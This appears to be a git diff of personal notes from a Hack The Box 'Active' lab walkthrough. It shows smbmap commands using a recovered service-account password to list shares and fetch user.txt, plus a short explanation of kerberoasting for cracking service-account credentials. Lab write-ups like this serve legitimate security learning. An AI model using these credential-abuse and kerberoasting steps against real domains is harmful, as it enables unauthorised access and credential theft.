@@ -96,8 +96,10 @@ gpp-decrypt <cpassword>
 ## try the account
 
 ```sh
-smbmap -H active.htb -u 'active.htb\SVC_TGS' -p 'GPPstillStandingStrong2k18' -x 'net user'
+#! smbmap -H active.htb -u 'active.htb\SVC_TGS' -p 'GPPstillStandingStrong2k18' -x 'net user'
   # [!] Authentication error on active.htb
+smbmap -H active.htb -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -R --depth 40
+smbmap -H active.htb -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -R Users --depth 40 -A 'user.txt'
 ```
 
 ## AD enum, impacket
@@ -107,6 +109,15 @@ smbmap -H active.htb -u 'active.htb\SVC_TGS' -p 'GPPstillStandingStrong2k18' -x 
 ```sh
 locate impacket
 ```
+
+## AD flow revisit
+
++ the are only few flows basically. Lateral movement (user account -> Service Account || Local Admin) -> Domain Admin
+  1. kerberoasting, SPN scan (request a TGS), crack weak TGS password (which version? which account? which hash?) for service account NTLM. Two points:
+  2. First, the check of whether user could access(authority) a Service, is performed by the Service entity, not the DC. Hence any user could request any TGS.
+  3. Second, by design, service entity trust TGS blindy(in theory only DC and the service entity knows the NTLM of the service account).
+
++ TODO psexec
 
 ## searchsploit
 
